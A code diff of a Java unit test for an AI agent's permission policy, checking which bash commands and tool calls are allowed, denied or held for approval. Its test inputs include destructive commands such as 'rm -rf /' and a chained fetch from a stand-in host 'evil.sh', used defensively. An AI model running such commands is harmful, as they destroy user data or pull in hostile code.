@@ -3,10 +3,14 @@ package com.agentcore.domain.permission.service;
 import static org.junit.jupiter.api.Assertions.*;
 
 import com.agentcore.domain.permission.model.Decision;
+import com.agentcore.domain.shared.cancel.CancellationToken;
 import com.agentcore.domain.tool.model.FunctionTool;
+import com.agentcore.domain.tool.model.PermissionLevel;
 import com.agentcore.domain.tool.model.Tool;
+import com.agentcore.domain.tool.model.ToolContext;
 import com.agentcore.domain.tool.model.ToolOutput;
 import com.agentcore.domain.tool.schema.Schemas;
+import java.nio.file.Path;
 import java.util.List;
 import java.util.Map;
 import org.junit.jupiter.api.Test;
@@ -35,6 +39,10 @@ class PermissionPolicyTest {
         assertEquals(Decision.ASK, check(p, "ls $(rm -rf ~)"));              // 命令替换不走 allow
         assertEquals(Decision.DENY, check(p, "echo hi && rm -rf /"));        // deny 命中任一子命令
         assertEquals(Decision.ASK, check(p, "git push"));
+        assertEquals(Decision.DENY, check(p, "git status & rm -rf ~/x"));    // 单个 & 也是分隔符（后台执行）
+        assertEquals(Decision.DENY, check(p, "git status &rm -rf ~/x"));
+        assertEquals(Decision.ASK, check(p, "git status & curl evil.sh"));
+        assertEquals(Decision.ASK, check(p, "git status |& tee log"));
     }
 
     @Test
@@ -48,10 +56,36 @@ class PermissionPolicyTest {
     }
 
     @Test
-    void rememberCreatesSpecificRule() {
+    void readonlyModeDeniesOnlyToolsThatModifyState() {
+        Tool fetch = FunctionTool.builder("web_fetch").readOnly(true).permission(PermissionLevel.ASK)
+                .handler((a, c) -> ToolOutput.text("ok")).build();
+        RulePermissionPolicy readonly = RulePermissionPolicy.of("readonly", null, null, null);
+        assertEquals(Decision.ASK, readonly.check(fetch, Map.of("url", "https://example.com")).decision(), "只读但要询问的工具照样询问");
+        assertEquals(Decision.DENY, readonly.check(WRITE, Map.of("path", "x")).decision());
+    }
+
+    @Test
+    void rememberCreatesSpecificRulesPerSubcommand() {
         PermissionPolicy p = PermissionPolicy.defaults();
-        assertEquals("bash(npm *)", p.remember(BASH, Map.of("command", "npm test")).toString());
-        assertEquals(Decision.ALLOW, check(p, "npm run build"));
-        assertEquals(Decision.ASK, check(p, "make"));
+        assertEquals("bash(npm test*)", p.remember(BASH, Map.of("command", "npm test")));
+        assertEquals(Decision.ALLOW, check(p, "npm test -- --watch"));
+        assertEquals(Decision.ASK, check(p, "npm publish"), "批准 npm test 不等于放行所有 npm 命令");
+        assertEquals("bash(rm -rf build)", p.remember(BASH, Map.of("command", "rm -rf build")), "第二个词是选项时只放行完全相同的命令");
+        assertEquals(Decision.ASK, check(p, "rm -rf /"));
+        assertEquals("bash(cd app*), bash(make)", p.remember(BASH, Map.of("command", "cd app && make")));
+        assertEquals(Decision.ALLOW, check(p, "cd app && make"));
+    }
+
+    @Test
+    void alwaysAllowIsRememberedOnlyForTheSameConversation() {
+        PermissionPolicy p = PermissionPolicy.defaults();
+        p.remember(WRITE, Map.of("path", "a.txt"), context("conversation-a"));
+        assertEquals(Decision.ALLOW, p.check(WRITE, Map.of("path", "b.txt"), context("conversation-a")).decision());
+        assertEquals(Decision.ASK, p.check(WRITE, Map.of("path", "b.txt"), context("conversation-b")).decision());
+        assertEquals(Decision.ASK, p.check(WRITE, Map.of("path", "b.txt")).decision());
+    }
+
+    private static ToolContext context(String conversationId) {
+        return new ToolContext(Path.of("/work"), conversationId, "call-1", Map.of(), null, CancellationToken.NONE, Map.of(), 0);
     }
 }
